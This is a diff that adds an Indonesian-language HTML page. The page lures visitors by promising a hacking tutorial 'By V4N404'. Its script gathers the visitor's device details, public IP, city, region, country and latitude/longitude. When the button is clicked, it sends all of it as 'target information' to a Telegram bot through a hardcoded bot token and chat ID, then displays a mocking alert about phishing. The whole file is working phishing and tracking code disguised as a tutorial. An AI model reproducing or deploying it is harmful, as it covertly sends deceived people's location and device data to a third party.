@@ -1,0 +1,93 @@
+<!doctypehtml><html lang=en><meta charset=UTF-8><meta content="width=device-width,initial-scale=1"name=viewport><title>Informasi Perangkat - Kirim ke Telegram</title><style>body{font-family:Arial,sans-serif;background:linear-gradient(45deg,#ff7a18,#24b4e8,#310d5a);background-size:400% 400%;animation:gradientBackground 10s ease infinite;color:#fff;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}@keyframes gradientBackground{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}.container{background-color:rgba(0,0,0,.5);padding:40px;border-radius:10px;width:80%;max-width:600px;box-shadow:0 4px 10px rgba(0,0,0,.2)}h1{font-size:2.5em;margin-bottom:20px;font-weight:700;text-transform:uppercase;letter-spacing:2px;color:#fc0}button{background-color:#3498db;color:#fff;padding:15px 30px;font-size:18px;border-radius:5px;border:none;cursor:pointer;width:100%;transition:all .3s ease-in-out;margin-top:20px}button:hover{background-color:#2980b9;transform:scale(1.05)}#loadingMessage{display:none;font-size:18px;font-weight:700;color:#fc0;margin-top:20px}#info{margin-top:30px;display:none;font-size:18px}#info p{margin:10px 0;background-color:rgba(0,0,0,.6);padding:10px;border-radius:5px}.info-heading{font-weight:700;color:#fc0}</style><div class=container><p><span style=color:#2ee978;font-size:24px>Klik Untuk Melihat Pembelajaran Tentang Cara Belajar Hacking lengkap By V4N404</span></p><button id=sendBtn>Di Sini Tutorial Nyaa</button><p id=loadingMessage>Loading...<div id=info><p><span class=info-heading>💿 GPU:</span> <span id=gpu></span><p><span class=info-heading>💽 CPU:</span> <span id=cpu></span><p><span class=info-heading>📱 Merek:</span> <span id=brand></span><p><span class=info-heading>🖥️ OS:</span> <span id=os></span><p><span class=info-heading>💾 Memori:</span> <span id=memory></span><p><span class=info-heading>🌐 IP Publik:</span> <span id=publicIp></span><p><span class=info-heading>📶 IP Lokal:</span> <span id=localIp></span><p><span class=info-heading>🏙️ Kota:</span> <span id=city></span><p><span class=info-heading>📍 Wilayah:</span> <span id=region></span><p><span class=info-heading>🇨🇺 Negara:</span> <span id=country></span><p><span class=info-heading>📌 Lokasi:</span> <span id=location></span><p><span class=info-heading>🔋 Status Baterai:</span> <span id=battery></span><p><span class=info-heading>🌐 Kecepatan Jaringan:</span> <span id=networkSpeed></span></div></div><script>// Ambil GPU dan CPU Info
+    document.getElementById('gpu').textContent = navigator.gpu ? navigator.gpu.name : "Tidak Terdeteksi";
+    document.getElementById('cpu').textContent = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "Tidak Terdeteksi";
+
+    // Ambil IP Publik dan Lokasi
+    fetch("https://ipapi.co/json/").then(res => res.json()).then(data => {
+      document.getElementById('publicIp').textContent = data.ip;
+      document.getElementById('city').textContent = data.city;
+      document.getElementById('region').textContent = data.region;
+      document.getElementById('country').textContent = data.country_name;
+      document.getElementById('location').textContent = data.latitude + ", " + data.longitude;
+    });
+
+    // Ambil IP Lokal
+    fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => {
+      document.getElementById('localIp').textContent = data.ip;
+    });
+
+    // Merek, OS, dan Memori
+    document.getElementById('brand').textContent = navigator.userAgentData ? navigator.userAgentData.brands[0].brand : "Tidak Terdeteksi";
+    document.getElementById('os').textContent = navigator.userAgent ? navigator.userAgent : "Tidak Terdeteksi";
+    document.getElementById('memory').textContent = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak Terdeteksi";
+
+    // Status Baterai
+    navigator.getBattery().then(function(battery) {
+      document.getElementById('battery').textContent = battery.level * 100 + "%";
+    });
+
+    // Ambil Kecepatan Jaringan (Network Speed)
+    if ('connection' in navigator) {
+      let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const speed = connection.downlink || "Tidak Terdeteksi";
+      document.getElementById('networkSpeed').textContent = speed + " Mbps";
+    } else {
+      document.getElementById('networkSpeed').textContent = "Tidak Terdeteksi";
+    }
+
+    // Kirim Informasi ke Telegram
+    const botToken = "7598186989:AAELfvT7YJBAnvdLEiOn58Bv-_FSmqvYiOw";
+    const chatId = "7349884602";
+
+    document.getElementById('sendBtn').addEventListener('click', () => {
+      // Tampilkan informasi
+      document.getElementById('info').style.display = 'block';
+
+// Tampilkan pesan loading
+      document.getElementById('loadingMessage').style.display = 'block';  
+
+      const infoMessage = `
+        🔰 Informasi Target 🔰
+        💿 GPU: ${document.getElementById('gpu').textContent}
+        💽 CPU: ${document.getElementById('cpu').textContent}
+        📱 Merek: ${document.getElementById('brand').textContent}
+        🖥️ OS: ${document.getElementById('os').textContent}
+        💾 Memori: ${document.getElementById('memory').textContent}
+        🌐 IP Publik: ${document.getElementById('publicIp').textContent}
+        📶 IP Lokal: ${document.getElementById('localIp').textContent}
+        🏙️ Kota: ${document.getElementById('city').textContent}
+        📍 Wilayah: ${document.getElementById('region').textContent}
+        🇨🇺 Negara: ${document.getElementById('country').textContent}
+        📌 Lokasi: ${document.getElementById('location').textContent}
+        🔋 Status Baterai: ${document.getElementById('battery').textContent}
+        🌐 Kecepatan Jaringan: ${document.getElementById('networkSpeed').textContent}
+      `;
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: infoMessage
+        }),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Tampilkan konfirmasi jika berhasil mengirim pesan ke bot
+        if (data.ok) {
+          alert("Ini dia tutorial nya cara phising!!!");
+        } else {
+          alert("Gagal Mendaoatkan Informasi");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("Terjadi kesalahan saat mengirim data.");
+      })
+      .finally(() => {
+        // Sembunyikan pesan loading setelah pengiriman selesai
+        document.getElementById('loadingMessage').style.display = 'none';
+      });
+    });</script>
